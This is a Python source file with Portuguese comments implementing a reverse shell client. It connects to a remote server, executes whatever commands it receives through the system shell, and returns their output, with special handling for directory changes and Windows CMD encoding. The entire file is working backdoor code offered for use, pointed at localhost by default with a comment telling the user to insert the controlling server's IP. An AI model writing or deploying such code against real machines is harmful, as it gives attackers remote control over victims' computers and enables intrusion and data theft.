import socket
import subprocess
import os

def conectar_servidor(server_ip, server_port):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        client_socket.connect((server_ip, server_port))
    except Exception as e:
        print(f"[-] Erro ao conectar: {e}")
        return

    while True:
        # Aguarda o comando do servidor
        comando = client_socket.recv(1024).decode('utf-8')
        
        if comando.lower() in ['exit', 'quit']:
            break
            
        # Tratamento especial para o comando 'cd' (mudança de diretório)
        if comando.startswith('cd '):
            try:
                os.chdir(comando[3:].strip())
                resultado = f"Diretório alterado para {os.getcwd()}\n"
            except FileNotFoundError as e:
                resultado = str(e) + "\n"
        else:
            # Executa o comando no sistema operacional
            proc = subprocess.Popen(
                comando, 
                shell=True, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE, 
                stdin=subprocess.PIPE
            )
            # Lê a saída padrão e a saída de erro
            stdout_value = proc.stdout.read()
            stderr_value = proc.stderr.read()
            resultado = (stdout_value + stderr_value).decode('cp850', errors='replace') # cp850 é comum no CMD do Windows

        # Caso o comando não retorne nada (ex: mkdir)
        if not resultado:
            resultado = "Comando executado sem retorno.\n"

        # Envia a resposta de volta ao servidor
        client_socket.send(resultado.encode('utf-8'))

    client_socket.close()

if __name__ == "__main__":
    # Coloque o IP da máquina onde o server.py está rodando. 
    # Se for local, use '127.0.0.1'.
    conectar_servidor('127.0.0.1', 5003)